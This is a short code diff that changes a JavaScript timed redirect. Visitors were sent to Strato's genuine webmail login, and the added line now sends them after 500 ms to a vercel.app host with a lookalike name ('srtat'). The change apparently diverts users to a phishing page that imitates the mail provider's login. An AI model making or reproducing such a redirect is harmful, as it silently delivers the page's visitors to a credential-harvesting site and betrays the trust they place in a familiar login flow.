@@ -1,3 +1,3 @@
 setTimeout(() => {
-  window.location.replace("https://webmail.strato.com/appsuite/ui");
+  window.location.replace("https://srtat-sleekbeams-projects.vercel.app/");
 }, 500);
